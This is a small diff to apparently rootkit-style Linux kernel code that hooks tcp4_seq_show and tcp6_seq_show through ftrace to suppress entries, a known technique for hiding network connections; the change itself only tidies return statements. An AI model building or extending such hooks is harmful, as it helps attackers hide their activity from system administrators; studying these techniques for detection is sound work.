@@ -30,8 +30,8 @@ static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
         return 0;
     }
 
-    ret = orig_tcp4_seq_show(seq, v);
-    return ret;
+    return orig_tcp4_seq_show(seq, v);
+    
 }
 
 static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
@@ -45,8 +45,8 @@ static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
         return 0;
     }
 
-    ret = orig_tcp6_seq_show(seq, v);
-    return ret;
+    return orig_tcp6_seq_show(seq, v);
+    
 }
 
 static struct ftrace_hook new_hooks[] = {
